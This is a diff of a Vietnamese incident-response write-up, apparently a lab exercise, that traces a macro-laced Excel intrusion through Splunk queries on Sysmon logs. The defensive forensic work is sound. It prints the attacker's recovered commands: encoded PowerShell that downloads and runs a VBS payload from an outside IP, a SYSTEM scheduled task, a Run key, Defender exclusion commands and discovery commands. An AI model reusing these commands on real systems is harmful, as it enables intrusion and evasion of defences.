@@ -12,11 +12,11 @@ Your objective is to analyze the artifacts left behind, track the attacker’s m
 
 | Host | IP |
 |---|---|
-| WS1 | `10.10.11.29` | 
-| DC01 | `10.10.11.170` | 
-| ITWS | `10.10.11.199` |
+| WS1 | 10.10.11.29 | 
+| DC01 | 10.10.11.170 | 
+| ITWS | 10.10.11.199 |
 
-Domain: `FINANCEES.LOCAL`
+Domain: FINANCEES.LOCAL
 
 # Điều tra
 
@@ -30,47 +30,53 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1
 | sort 0 _time
 ```
 
+
 ![Zone.Identifier của Financial Records.zip trên WS1](images/image1.png)
 
-Vào **15:08:41**, trên host WS1, user knixon sử dụng msedge.exe tải về tệp C:\Users\knixon\Downloads\Financial Records.zip. MOTW (mark of the web) hay ADS Zone.Identifier cho thông tin tệp này được tải về từ URL http://54.93.105.22/Financial%20Records.zip 
+Vào 2025-03-21 15:08:41, trên host WS1, user knixon sử dụng msedge.exe tải về tệp C:\Users\knixon\Downloads\Financial Records.zip. MOTW (mark of the web) hay ADS Zone.Identifier cho thông tin tệp này được tải về từ URL http://54.93.105.22/Financial%20Records.zip 
 
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:14:24:00" latest="03/21/2025:15:30:00" EventCode=1 CommandLine="*winrar*Financial*"
 | table _time parent_process_id parent_process_path process_id CommandLine
 ```
 
+
 ![WinRAR mở Financial Records.zip](images/image2.png)
 
-Sau khi tải tệp thành công, vào **15:08:48**, user knixon khởi chạy WinRar.exe (5692) giải nén tệp vừa tải về
+Sau khi tải tệp thành công, vào 2025-03-21 15:08:48, user knixon khởi chạy WinRar.exe (5692) giải nén tệp vừa tải về
 
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:08:00" latest="03/21/2025:16:00:00" process_id=5692 EventCode=11
 | table _time TargetFilename
 ```
 
+
 ![WinRAR tạo Financial Records.xlsm trong thư mục tạm](images/image3.png)
 
-Vào **15:08:52**, tệp zip `Financial Records.zip` giải nén ra một tệp excel là `Financial Records.xlsm`, đuôi xlsm cho biết tệp này chứa macro
+Vào 2025-03-21 15:08:52, tệp zip Financial Records.zip giải nén ra một tệp excel là Financial Records.xlsm, đuôi xlsm cho biết tệp này chứa macro
 
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:00:00" "Financial Records.xlsm" EventCode=15
 | table _time TargetFilename Hash
 ```
 
+
 ![Hash của workbook và stream Zone.Identifier](images/image4.png)
 
-Hash của `Financial Records.xlsm`:
+Hash của Financial Records.xlsm:
 
-- MD5: `1157A1B4C47091B7020143D00B5D2860`
-- SHA256: `030E7AD9B95892B91A070AC725A77281645F6E75CFC4C88F53DBF448FFFD1E15`
+- MD5: 1157A1B4C47091B7020143D00B5D2860
+- SHA256: 030E7AD9B95892B91A070AC725A77281645F6E75CFC4C88F53DBF448FFFD1E15
 ### 1.2 Process tree
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:08:00" EventCode=1
 | table _time user IntegrityLevel LogonId LogonGuid parent_process_id parent_process_path process_id CommandLine
 | sort _time
 ```
+
 Hoạt động các process độc hại sau khi macro trong tệp "Financial Records.xlsm" được cho phép thực thi:
-```
+
+```spl
 Các process dưới đều thực thi với Integrity level = medium, user = knixon, logonId = 0x10d103f, logonGuid = {c73af8d8-7497-67dd-3f10-0d0100000000}
 
                      [4348] C:\Windows\explorer.exe
@@ -78,10 +84,10 @@ Các process dưới đều thực thi với Integrity level = medium, user = kn
 2025-03-21 15:08:55  ├── [10924] "C:\Program Files\Microsoft Office\Office16\EXCEL.EXE" /dde
 2025-03-21 15:09:32  │   ├── [8600] "C:\Windows\System32\cmd.exe" /c powershell -ExecutionPolicy Bypass -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwA1ADQALgA5ADMALgAxADAANQAuADIAMgAvAEYANgB3ADEAUwA0ADgALgB2AGIAcwAnACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABUAGUAbQBwAFwARgA2AHcAMQBTADQAOAAuAHYAYgBzACIAOwAgAGMAbQBkAC4AZQB4AGUAIAAvAGMAIAAiACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQBcAFQAZQBtAHAAXABGADYAdwAxAFMANAA4AC4AdgBiAHMAIgBgAA==
 2025-03-21 15:09:55  │   │   └── [8824] powershell  -ExecutionPolicy Bypass -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwA1ADQALgA5ADMALgAxADAANQAuADIAMgAvAEYANgB3ADEAUwA0ADgALgB2AGIAcwAnACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABUAGUAbQBwAFwARgA2AHcAMQBTADQAOAAuAHYAYgBzACIAOwAgAGMAbQBkAC4AZQB4AGUAIAAvAGMAIAAiACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQBcAFQAZQBtAHAAXABGADYAdwAxAFMANAA4AC4AdgBiAHMAIgBgAA==
-								 -> Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"`
+								 -> Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"
 2025-03-21 15:12:02  │   ├── [11268] "C:\Windows\System32\cmd.exe" /c powershell -ExecutionPolicy Bypass -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwA1ADQALgA5ADMALgAxADAANQAuADIAMgAvAEYANgB3ADEAUwA0ADgALgB2AGIAcwAnACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABUAGUAbQBwAFwARgA2AHcAMQBTADQAOAAuAHYAYgBzACIAOwAgAGMAbQBkAC4AZQB4AGUAIAAvAGMAIAAiACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQBcAFQAZQBtAHAAXABGADYAdwAxAFMANAA4AC4AdgBiAHMAIgBgAA==
 2025-03-21 15:12:02  │   │   └── [12108] powershell  -ExecutionPolicy Bypass -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwA1ADQALgA5ADMALgAxADAANQAuADIAMgAvAEYANgB3ADEAUwA0ADgALgB2AGIAcwAnACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABUAGUAbQBwAFwARgA2AHcAMQBTADQAOAAuAHYAYgBzACIAOwAgAGMAbQBkAC4AZQB4AGUAIAAvAGMAIAAiACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQBcAFQAZQBtAHAAXABGADYAdwAxAFMANAA4AC4AdgBiAHMAIgBgAA==
-							     -> Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"`
+							     -> Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"
 2025-03-21 15:15:26  │   └── [3168] "C:\Windows\System32\cmd.exe" /c powershell -ExecutionPolicy Bypass -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwA1ADQALgA5ADMALgAxADAANQAuADIAMgAvAEYANgB3ADEAUwA0ADgALgB2AGIAcwAnACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABUAGUAbQBwAFwARgA2AHcAMQBTADQAOAAuAHYAYgBzACIAOwAgAGMAbQBkAC4AZQB4AGUAIAAvAGMAIAAiACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQBcAFQAZQBtAHAAXABGADYAdwAxAFMANAA4AC4AdgBiAHMAIgA=
 2025-03-21 15:15:27  │       └── [8684] powershell  -ExecutionPolicy Bypass -NoP -W Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwA1ADQALgA5ADMALgAxADAANQAuADIAMgAvAEYANgB3ADEAUwA0ADgALgB2AGIAcwAnACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoATABPAEMAQQBMAEEAUABQAEQAQQBUAEEAXABUAGUAbQBwAFwARgA2AHcAMQBTADQAOAAuAHYAYgBzACIAOwAgAGMAbQBkAC4AZQB4AGUAIAAvAGMAIAAiACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQBcAFQAZQBtAHAAXABGADYAdwAxAFMANAA4AC4AdgBiAHMAIgA=
 								 -> Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"
@@ -147,9 +153,9 @@ Các process dưới đều thực thi với Integrity level = High, user = knix
 2025-03-21 16:52:52  │           └── [9716] powershell  Remove-Item -Path "$env:LOCALAPPDATA\Temp\*" -Recurse -Force
 2025-03-21 15:32:05  └── [1168] "C:\Windows\system32\cmd.exe"
 2025-03-21 15:32:32      └── [1676] bitsadmin  /transfer "d" https://www.softperfect.com/download/files/netscan_portable.zip C:\Users\knixon\AppData\Local\Temp\Netscan.zip
-
-
 ```
+
+
 ### 1.3 Process Excel.exe (10924) – khởi chạy vào 2025-03-21 15:08:55
 
 ```spl
@@ -161,9 +167,9 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1
 Từ 2025-03-21 15:08:55 đến 2025-03-21 15:15:27, sau khi user click vào tệp Financial Records.xslsm chứa macro, Excel.exe khởi chạy và sau đó spawn ra 3 process cmd.exe thực thi một lệnh powershell. Lệnh này decode base64 và thực thi một đoạn powershell với cửa sổ ẩn (-w Hidden) và bỏ qua việc nạp profile powershell (-NoP). Lần lượt decode 3 lệnh sử dụng cyberchef:
 
 ```powershell
-Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"`
+Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"
 
-Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"`
+Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"
 
 Invoke-WebRequest -Uri 'http://54.93.105.22/F6w1S48.vbs' -OutFile "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"; cmd.exe /c "$env:LOCALAPPDATA\Temp\F6w1S48.vbs"
 ```
@@ -175,9 +181,10 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1
 | table _time TargetFilename process_id Image
 ```
 
+
 ![PowerShell PID 8684 tạo F6w1S48.vbs](images/image10.png)
 
-Event 11 chỉ ghi nhận process cmd.exe với PID 8684 thành công drop `F6w1S48.vbs` lúc **15:15:28**. Hai process cmd.exe (PID 11268 và 8600) spawn ra trước đó đều thất bại vì thừa dấu backtick (`) ở cuối
+Event 11 chỉ ghi nhận process cmd.exe với PID 8684 thành công drop F6w1S48.vbs lúc 2025-03-21 15:15:28. Hai process cmd.exe (PID 11268 và 8600) spawn ra trước đó đều thất bại vì thừa dấu backtick (`) ở cuối
 
 Một dấu vết khác nằm trong registry của Excel:
 
@@ -187,22 +194,25 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1
 | sort 0 _time
 ```
 
+
 ![Excel thay đổi TrustRecords cho Financial Records.xlsm](images/image11.png)
 
-Vào **15:09:23** và **15:09:25**, Excel đã ghi 2 giá trị liên quan tới `Financial Records.xlsm` vào key `Excel\Security\Trusted Documents\TrustRecords` (key được dùng để ghi nhớ các tệp Excel mà người dùng đã bấm "Tin tưởng" khi mở ra). Hai lần ghi tương ứng với hành vi user chủ động click chọn “enable editing” và “enable contents” (enable macro) sau khi mở tệp .xlsm trên
+Vào 2025-03-21 15:09:23 và 2025-03-21 15:09:25, Excel đã ghi 2 giá trị liên quan tới Financial Records.xlsm vào key Excel\Security\Trusted Documents\TrustRecords (key được dùng để ghi nhớ các tệp Excel mà người dùng đã bấm "Tin tưởng" khi mở ra). Hai lần ghi tương ứng với hành vi user chủ động click chọn “enable editing” và “enable contents” (enable macro) sau khi mở tệp .xlsm trên
 
 ### 1.3 Phiên logon và quyền tài khoản knixon
 ```spl
 index=main host=WS1 EventCode IN (4624, 4672) 0x10d103f
 ```
+
 ![alt text](images/image.png)
 
-Log chưa cho thông tin Event ID 4624/4672 gắn với phiên login `0x10d103f` (phiên login xảy ra sự cố), nên chưa xác định đầy đủ nguồn gốc phiên này.
+Log chưa cho thông tin Event ID 4624/4672 gắn với phiên login 0x10d103f (phiên login xảy ra sự cố), nên chưa xác định đầy đủ nguồn gốc phiên này.
 
 ```spl
 index=main source="XmlWinEventLog:Security" host=WS1 EventCode=4627 knixon
 | table _time TargetUserName TargetUserSid GroupMembership
 ```
+
 
 ![Group membership của knixon trong một phiên đăng nhập khác](images/image7.png)
 
@@ -210,7 +220,7 @@ Tuy nhiên, ổ một phiên logon khác của user knixon, Event 4627 (Group me
 
 ### 1.4 Process WScript.exe (PID = 1848) – khởi chạy tệp F6w1S48.vbs vào 2025-03-21 15:15:29
 
-Process `WScript.exe` (1848) khởi chạy lúc **15:15:29** với command:
+Process WScript.exe (1848) khởi chạy lúc 2025-03-21 15:15:29 với command:
 
 ```text
 "C:\Windows\System32\WScript.exe" "C:\Users\knixon\AppData\Local\Temp\F6w1S48.vbs"
@@ -221,6 +231,7 @@ index=main host=WS1 earliest="03/21/2025:15:08:00" EventCode=4689 process=*wscri
 | eval process_id=tonumber(process_id, 16)
 | table _time process_name process_id
 ```
+
 ![alt text](images/image-2.png)
 
 Process wscript.exe terminate sau khoảng 6 giây thực thi
@@ -229,6 +240,7 @@ Process wscript.exe terminate sau khoảng 6 giây thực thi
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:15:20" latest="03/21/2025:15:16:00" process_id=1848 OR SourceProcessId=1848 OR parent_process_id=1848
 | stats count by EventCode
 ```
+
 ![alt text](images/image-1.png)
 Thống kê các event sysmon liên quan đến process này trong khoảng thời gian thực thi
 
@@ -237,12 +249,14 @@ Thống kê các event sysmon liên quan đến process này trong khoảng th�
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:15:20" latest="03/21/2025:15:16:00" process_id=1848 EventCode=3
 | table _time SourceIp SourcePort DestinationIp DestinationPort
 ```
+
 Vào 2025-03-21 15:15:31,  ghi nhận Wscript.exe (1848) thực hiện kết nối tới external IP là 54.93.105.22 trên port 80 (giao thức HTTP) nhằm trà trộn vào traffic thông thường
 
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:15:20" latest="03/21/2025:15:16:00" process_id=1848 EventCode=29
 | table _time TargetFilename Hashes
 ```
+
 ![alt text](images/image-3.png)
 
 Lúc 2025-03-21 15:15:29, drop payload WindowsUpdaterFX.dll vào thư mục C:\Users\knixon\AppData\Local\Temp\
@@ -261,35 +275,38 @@ index=main host=WS1 earliest="03/21/2025:15:15:30" EventCode=4689 process=*regsv
 | eval process_id=tonumber(process_id, 16)
 | table _time process_name process_id
 ```
+
 ![alt text](images/image-4.png)
 
-Process regsvr32.exe (PID = 8592) kết thúc vào lúc 15:15:35, gần như ngay lập tức sau khi khởi chạy
+Process regsvr32.exe (PID = 8592) kết thúc vào lúc 2025-03-21 15:15:35, gần như ngay lập tức sau khi khởi chạy
 
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:15:20" latest="03/21/2025:15:16:00" process_id=8592 OR SourceProcessId=8592 OR parent_process_id=8592
 | stats count by EventCode
 ```
+
 ![alt text](images/image-5.png)
 Thông kê các event sysmon liên quan đến process này trong khoảng thời gian thực thi
  
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:15:20" latest="03/21/2025:15:16:00" process_id=8592 EventCode=11
 | table _time Image TargetFilename
-
+```
+```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:15:20" latest="03/21/2025:15:16:00" process_id=8592 EventCode=29
 | table _time Image TargetFilename Hashes
-
 ```
+
 ![alt text](images/image-6.png)
 
 ![alt text](images/image-7.png)
 
-Lúc 15:15:35, `regsvr32.exe` drop hai tệp:
+Lúc 2025-03-21 15:15:35, regsvr32.exe drop hai tệp:
  
-- `C:\Users\knixon\AppData\Local\Temp\Pancake.jpg.exe`: tệp mang tên đuôi kép `.jpg.exe`, vì windows mặc định ẩn phần mở rộng nên tệp hiện ra trong GUI như là 1 tệp ảnh jpg vô hại. Hash:
-    - MD5: `5C215C4E29C8EC7FE1590517319C6ECA`
-    - SHA256: `0BEF3A121BC1CADD69B27784616D1E112ADE2A82F961272EDDF7F7641A80CE15`
-- `...\INetCache\IE\UK9B4KJM\OneDriveUpdater[1].exe`: đặt tên giả mạo một trình cập nhật OneDrive, drop trong cache của trình duyệt.
+- C:\Users\knixon\AppData\Local\Temp\Pancake.jpg.exe: tệp mang tên đuôi kép .jpg.exe, vì windows mặc định ẩn phần mở rộng nên tệp hiện ra trong GUI như là 1 tệp ảnh jpg vô hại. Hash:
+    - MD5: 5C215C4E29C8EC7FE1590517319C6ECA
+    - SHA256: 0BEF3A121BC1CADD69B27784616D1E112ADE2A82F961272EDDF7F7641A80CE15
+- ...\INetCache\IE\UK9B4KJM\OneDriveUpdater[1].exe: đặt tên giả mạo một trình cập nhật OneDrive, drop trong cache của trình duyệt.
 
 Ngoài ra, không ghi nhận process regsvr32 này có kết nối mạng (event Sysmon 3) trong thống kê ở trên. Giả thuyết ở đây là cả 2 payload nhúng sẵn trong tệp DLL  đăng ký qua regsvr32 được decode/decrypt trong lúc thực thi rồi drop ra ổ đĩa
 
@@ -297,32 +314,35 @@ Ngoài ra, không ghi nhận process regsvr32 này có kết nối mạng (event
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:15:20" latest="03/21/2025:15:16:00" parent_process_id=8592
 | table _time user IntegrityLevel process_id CommandLine
 ```
+
 ![alt text](images/image-8.png)
  
 Spawn ra 6 process con:
  
 | PID | Lệnh | Giải thích |
 |---|---|---|
-| 10536 | `cmd /c powershell -ExecutionPolicy Bypass -NoP -W Hidden -EncodedCommand ...` | `Start-Process $env:LOCALAPPDATA\Temp\Pancake.jpg.exe`: khởi chạy payload vừa drop |
-| 10040 | `schtasks /Create /RU "NT AUTHORITY\SYSTEM" /SC ONLOGON /TN "WiindowsUpdate" /TR "C:\Windows\System32\regsvr32.exe /s %localappdata%\Temp\WindowsUpdaterFX.dll"` | Tạo scheduled task với tên WiindowsUpdate (attacker thừa 1 chữ i) chạy lại dưới danh tính SYSTEM khi user đăng nhập |
-| 1432 | `cmd /c powershell ... -EncodedCommand JABvAGIAagBTAG...` | `$objShell.RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater", "wscript.exe %LOCALAPPDATA%/Temp/F6w1S48.vbs", "REG_SZ")`: Tạo Run key trong hive HKCU (chỉ có tác dụng với user knixon) với tên WindowsUpdater, value là 1 câu lệnh thực thi payload F6w1S48.vbs  |
-| 5380 | `cmd /c powershell ... -EncodedCommand` | `Add-MpPreference -ExclusionPath "%LOCALAPPDATA%/Temp"`: chỉnh cấu hình Window Defender yêu cầu Defender skip quét các items trong thư mục Temp của user |
-| 432 | `cmd /c powershell ... -EncodedCommand` | `Add-MpPreference -ExclusionPath "%APPDATA%/Microsoft"`: chỉnh cấu hình Window Defender yêu cầu Defender skip quét các items trong thư mục AppData/Microsoft |
-| 10856 | `cmd /c powershell ... -EncodedCommand` | `Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\ssh"`: chỉnh cấu hình Window Defender yêu cầu Defender skip quét các items trong thư mục C:\ProgramData\Microsoft\ssh |
+| 10536 | cmd /c powershell -ExecutionPolicy Bypass -NoP -W Hidden -EncodedCommand ... | Start-Process $env:LOCALAPPDATA\Temp\Pancake.jpg.exe: khởi chạy payload vừa drop |
+| 10040 | schtasks /Create /RU "NT AUTHORITY\SYSTEM" /SC ONLOGON /TN "WiindowsUpdate" /TR "C:\Windows\System32\regsvr32.exe /s %localappdata%\Temp\WindowsUpdaterFX.dll" | Tạo scheduled task với tên WiindowsUpdate (attacker thừa 1 chữ i) chạy lại dưới danh tính SYSTEM khi user đăng nhập |
+| 1432 | cmd /c powershell ... -EncodedCommand JABvAGIAagBTAG... | $objShell.RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdater", "wscript.exe %LOCALAPPDATA%/Temp/F6w1S48.vbs", "REG_SZ"): Tạo Run key trong hive HKCU (chỉ có tác dụng với user knixon) với tên WindowsUpdater, value là 1 câu lệnh thực thi payload F6w1S48.vbs  |
+| 5380 | cmd /c powershell ... -EncodedCommand | Add-MpPreference -ExclusionPath "%LOCALAPPDATA%/Temp": chỉnh cấu hình Window Defender yêu cầu Defender skip quét các items trong thư mục Temp của user |
+| 432 | cmd /c powershell ... -EncodedCommand | Add-MpPreference -ExclusionPath "%APPDATA%/Microsoft": chỉnh cấu hình Window Defender yêu cầu Defender skip quét các items trong thư mục AppData/Microsoft |
+| 10856 | cmd /c powershell ... -EncodedCommand | Add-MpPreference -ExclusionPath "C:\ProgramData\Microsoft\ssh": chỉnh cấu hình Window Defender yêu cầu Defender skip quét các items trong thư mục C:\ProgramData\Microsoft\ssh |
  
  
-Hai lệnh `schtasks /Create /RU "NT AUTHORITY\SYSTEM"` và `Add-MpPreference -ExclusionPath` đều cần quyền admin, trong khi cả 6 process này chạy ở integrity level = Medium, kiểm chứng thêm với event 4698 và 5007:
+Hai lệnh schtasks /Create /RU "NT AUTHORITY\SYSTEM" và Add-MpPreference -ExclusionPath đều cần quyền admin, trong khi cả 6 process này chạy ở integrity level = Medium, kiểm chứng thêm với event 4698 và 5007:
  
 ```spl
 index=main host=WS1 earliest="03/21/2025:15:15:00" EventCode=4698
 | table _time user TaskName TaskContent
 ```
+
 ![alt text](images/image-9.png)
 Chưa ghi nhận task WiindowsUpdate được ghi nhận tạo thành công bởi event 4698 
 
 ```spl
 index=main host=WS1 source="XmlWinEventLog:Microsoft-Windows-Windows Defender/Operational"
 ```
+
 ![alt text](images/image-10.png)
 Trên WS1, log Window defender không chứa bất kì event nào nên ta chưa thể xác nhận liệu attacker đã thành công thay đổi cấu hình window defender với event id 5007
  
@@ -331,6 +351,7 @@ Trên WS1, log Window defender không chứa bất kì event nào nên ta chưa 
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:15:30" process_id=10292 OR SourceProcessId=10292 OR parent_process_id=10292
 | stats count by EventCode
 ```
+
 ![alt text](images/image-11.png)
 Thống kê các event sysmon liên quan đến process này
 
@@ -338,6 +359,7 @@ Thống kê các event sysmon liên quan đến process này
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:15:30" process_id=10292 EventCode IN (17, 18)
 | table _time EventDescription PipeName
 ```
+
 ![alt text](images/image-13.png)
 Process này tạo và kết nối tới pipe MSSE-8859-server lần lượt vào 2025-03-21 15:15:39 và 2025-03-21 15:15:41. Trong đó, pipe name dạng MSSE-###\#-server (tên mặc định của bộ công cụ Artifact Kit trong Cobalt Strike) thường được sử dụng bởi cobalt strike beacon nhằm tải payload vào memory, giao tiếp giữa các beacon khác. Attacker có thể đổi tên trong Malleable C2 profile nhưng ở đây hắn sử dụng tên mặc định.
 
@@ -346,6 +368,7 @@ index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1
 | bin _time span=10m
 | stats count by _time DestinationIp DestinationPort
 ```
+
 ![alt text](images/image-12.png)
 Duy trì beacon tới 54.93.105.22:80 khoảng 10 requests mỗi 10 phút trong khoảng hơn 1h
 
@@ -353,25 +376,27 @@ Duy trì beacon tới 54.93.105.22:80 khoảng 10 requests mỗi 10 phút trong 
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:15:30" parent_process_id=10292
 | table _time user IntegrityLevel process_id CommandLine
 ```
+
 ![alt text](images/image-14.png)
 Spawn ra các process thực hiện Discovery:
 | Giờ | Lệnh | Mục đích |
 |---|---|---|
-| 15:17:41 | `cmd /C whoami` | Kiểm tra user hiện tại |
-| 15:18:41 | `cmd /C ipconfig /all` | Kiểm tra cấu hình mạng của máy |
-| 15:20:42 | `cmd /C systeminfo` | Kiểm tra thông tin hệ thống của máy |
-| 15:21:46 | `cmd /C net group "domain admins" /domain` | Liệt kê toàn bộ thành viên thuộc group Domain Admins |
-| 15:22:46 | `cmd /C net localgroup administrators` | Liệt kê toàn bộ thành viên thuộc group Local Admins |
+| 15:17:41 | cmd /C whoami | Kiểm tra user hiện tại |
+| 15:18:41 | cmd /C ipconfig /all | Kiểm tra cấu hình mạng của máy |
+| 15:20:42 | cmd /C systeminfo | Kiểm tra thông tin hệ thống của máy |
+| 15:21:46 | cmd /C net group "domain admins" /domain | Liệt kê toàn bộ thành viên thuộc group Domain Admins |
+| 15:22:46 | cmd /C net localgroup administrators | Liệt kê toàn bộ thành viên thuộc group Local Admins |
 
 ### 1.7 Process Pancake.jpg.exe (PID = 10292) - khởi chạy lúc 15:15:3 với IntegrityLevel = High
 
-Lúc **15:23:21**, `Pancake.jpg.exe` được khởi chạy lần nữa với PID **6320**, lần này chạy ở IntegrityLevel = High tức thừa hưởng elevated token từ phiên login của user knixon. Process tree lúc trước cho biết parent của process này là explorer.exe, dấu hiệu cho thấy nó được thực thi thông qua GUI. Giả thuyết ở đây là user bị đánh lừa bởi bề ngoài hiển thi của tệp, 1 ảnh jpg, click vào binary ngụy trang, cửa sổ UAC hiện lên và user click yes cho phép process chạy với elevated token
+Lúc 2025-03-21 15:23:21, Pancake.jpg.exe được khởi chạy lần nữa với PID = 10292, lần này chạy ở IntegrityLevel = High tức thừa hưởng elevated token từ phiên login của user knixon. Process tree lúc trước cho biết parent của process này là explorer.exe, dấu hiệu cho thấy nó được thực thi thông qua GUI. Giả thuyết ở đây là user bị đánh lừa bởi bề ngoài hiển thi của tệp, 1 ảnh jpg, click vào binary ngụy trang, cửa sổ UAC hiện lên và user click yes cho phép process chạy với elevated token
 
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:23:00" process_id=6320 EventCode=3
 | bin _time span=10m
 | stats count by _time DestinationIp DestinationPort
 ```
+
 ![alt text](images/image-15.png)
 
 Tiếp tục duy trì beacon tới 54.93.105.22:80 khoảng 10 requests mỗi 10 phút trong hơn 1h tương tự như instance Pancake.jpg.exe lúc trước
@@ -379,10 +404,13 @@ Tiếp tục duy trì beacon tới 54.93.105.22:80 khoảng 10 requests mỗi 10
 ```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:23:00" process_id=6320 EventCode=11
 | table _time TargetFilename
+```
 
+```spl
 index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" host=WS1 earliest="03/21/2025:15:23:00" process_id=6320 EventCode=29
 | table _time TargetFilename Hashes
 ```
+
 ![alt text](images/image-16.png)
 
 ![alt text](images/image-17.png)
